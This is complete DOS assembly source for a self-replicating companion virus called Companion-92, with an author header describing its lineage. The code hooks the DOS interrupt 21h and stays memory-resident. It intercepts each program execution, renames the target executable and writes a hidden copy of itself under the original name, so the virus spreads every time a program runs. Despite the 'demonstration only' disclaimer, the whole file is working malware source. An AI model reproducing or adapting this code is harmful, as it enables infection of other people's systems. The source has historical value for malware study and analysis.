

;                       Companion-92
;
; This short companion virus is based in Companion-101 virus by Stormbringer.
; Companion-101's source code was printed in 'Computer Viruses, Artificial
; Life and Evolution' by Mark A. Ludwig.
; Companion-92 uses 286+ instructions so it doesn't work in stone-age PC's.
; Modifications are made by Raptor, 04/02/94.
; Don't spread this virus; it's only a demonstration.
;

.model tiny
.radix 16
.code
        org 100
start:
        mov     ax,3521
        int     21
        mov     word ptr [IP_21],bx
        mov     word ptr [CS_21],es             ;Get Int 21 address and save

        mov     dx,offset INT_21
        mov     ah,25                           ;Set Int 21 handler
        int     21

        mov     dl,offset End_Memory+1-100              ;Go TSR
        int     27

INT_21:
        cmp     ah,4bh                          ;If it's not an execute
        jne     Go_Int_21                       ;command, continue with
                                                ;Int 21

Execute:                                        ;DS:DX = Filename
        .286
        pusha                                   ;Same as 'db 60'
        .286P
        push    es                              ;PUSHA doesn't store es/ds
        push    ds
        push    dx                              ;Virus needs dx very soon
        mov     di,offset New_Fname             ;Setup regs to copy filename
        push    di
        mov     si,dx

        push    cs
        pop     es


Load_Filename:                                  ;Load filename into New_Fname
        lodsb
        stosb
        or      al,al
        jnz     Load_Filename

        mov     ah,'V'                          ;'V' = 56 = rename function
        mov     byte ptres:[di-2],ah           ;New name character
        pop     di                              ;Rename file to *.??V
        int     21
        jc      Already_There                   ;If it doesn't work, then
                                                ;it's probably already
                                                ;infected, so let's run the
                                                ;host file
Create_New_file:
        mov     ah,3c
        pop     dx
        push    dx
        mov     cl,0010b                        ;Create file with original
        int     21                              ;name

        push    cs
        pop     ds

        xchg    bx,ax                           ;All DEBUGgers know that
                                                ;'xchg bx,ax' is shorter than
                                                ;'xchg ax,bx', but it doesn't
                                                ;matter here
        mov     ah,40
        mov     cx,offset end_prog-100          ;Write virus to it
        mov     dx,100
        int     21

        mov     ah,3e
        int     21                              ;Close

Already_There:
        pop     dx
        pop     ds                              ;POPA doesn't restore ds/es
        mov     byte ptr ds:[si-2],'V'          ;Change last byte of orig.
                                                ;filename to run host
        pop     es
        .286
        popa                                    ;Same as 'db 61'
        .286P

Go_Int_21:
        db      0ea                             ;Jump to Int 21
end_prog:
IP_21   dw      ?
CS_21   dw      ?
New_Fname       db      30 dup (?)
End_Memory:
end start

